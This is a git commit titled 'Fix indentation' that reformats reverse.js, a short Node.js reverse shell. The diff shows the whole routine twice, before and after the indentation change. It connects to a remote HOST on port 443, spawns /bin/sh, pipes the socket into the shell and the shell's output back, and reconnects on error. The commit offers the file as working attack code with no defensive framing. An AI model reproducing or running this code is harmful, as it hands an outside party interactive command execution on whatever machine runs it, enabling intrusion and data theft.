8571f5637dbbaf0ffcdfc4bd056378985d892c84
anatol <tolean.dj@gmail.com>
2016-05-20 18:04:29 +0300

    Fix indentation

--- reverse.js
+++ reverse.js
@@ -18,16 +18,16 @@ PORT="443";
 TIMEOUT="5000";
 
 function c(HOST,PORT) {
-    var client = new net.Socket();
-    client.connect(PORT, HOST, function() {
-        var sh = spawn('/bin/sh',[]);
-        client.write("Connected\r\n");
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-    });
-    client.on('error', function(e) {
-        setTimeout(c(HOST,PORT), TIMEOUT);
-    });
+  var client = new net.Socket();
+  client.connect(PORT, HOST, function() {
+    var sh = spawn('/bin/sh',[]);
+    client.write("Connected\r\n");
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+  });
+  client.on('error', function(e) {
+    setTimeout(c(HOST,PORT), TIMEOUT);
+  });
 }
 
 c(HOST,PORT);
